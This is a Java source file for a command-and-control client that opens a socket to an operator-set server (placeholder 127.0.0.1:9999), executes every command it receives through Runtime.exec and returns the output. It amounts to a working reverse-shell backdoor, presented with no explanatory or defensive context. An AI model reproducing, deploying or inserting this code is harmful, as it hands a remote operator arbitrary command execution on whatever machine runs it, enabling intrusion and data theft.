 import java.io.*;
        import java.net.*;

public class C2Client {
    public static void main(String[] args) {
        String serverIp = "127.0.0.1"; // Change to your server's IP
        int serverPort = 9999;

        try (Socket socket = new Socket(serverIp, serverPort);
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {

            String command;
            while ((command = in.readLine()) != null) {
                if (command.equalsIgnoreCase("exit")) {
                    break;
                }
                Process process = Runtime.getRuntime().exec(command);
                BufferedReader processOutput = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = processOutput.readLine()) != null) {
                    output.append(line).append("\n");
                }
                out.println(output.toString());
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}


